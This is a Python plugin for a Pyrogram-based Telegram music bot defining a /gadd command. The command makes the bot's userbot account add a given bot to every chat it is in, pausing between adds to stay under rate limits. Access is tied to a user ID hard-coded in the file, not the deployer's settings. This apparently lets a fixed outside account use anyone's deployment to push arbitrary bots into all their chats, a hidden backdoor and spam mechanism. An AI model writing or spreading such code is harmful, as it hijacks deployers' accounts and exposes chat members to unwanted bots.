import asyncio

from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
OWNERS = "7400383704"
from BABYMUSIC import app
from BABYMUSIC.utils.database import add_served_chat, get_assistant


@app.on_message(filters.command("gadd") & filters.user(int(OWNERS)))
async def add_allbot(client, message):
    command_parts = message.text.split(" ")
    if len(command_parts) != 2:
        await message.reply(
            "**Please use like :- `/gadd @Youtube_rrobot`**"
        )
        return

    bot_username = command_parts[1]
    try:
        userbot = await get_assistant(message.chat.id)
        bot = await app.get_users(bot_username)
        app_id = bot.id
        done = 0
        failed = 0
        lol = await message.reply("**Adding given bot in all chats!**")
        await userbot.send_message(bot_username, f"/start")
        async for dialog in userbot.get_dialogs():
            if dialog.chat.id == -1001550054357:
                continue
            try:

                await userbot.add_chat_members(dialog.chat.id, app_id)
                done += 1
                await lol.edit(
                    f"**🚀 Adding {bot_username}**\n\n**🎉 Added in {done} chats ✔**\n**⛔ Failed in {failed} chats ✘**\n\n**🥇 Added by :-** @{userbot.username}"
                )
            except Exception as e:
                failed += 1
                await lol.edit(
                    f"**🚀 Adding {bot_username}**\n\n**🎉 Added in {done} chats ✔**\n**⛔ Failed in {failed} chats ✘**\n\n**🥇 Added by :-** @{userbot.username}"
                )
            await asyncio.sleep(3)  # Adjust sleep time based on rate limits

        await lol.edit(
            f"**🤖 {bot_username} bot added successfully 🎉**\n\n**🎉 Added in {done} chats ✅**\n**⛔ Failed in {failed} chats ✘**\n\n**🥇 Added by** @{userbot.username}"
        )
    except Exception as e:
        await message.reply(f"Error: {str(e)}")
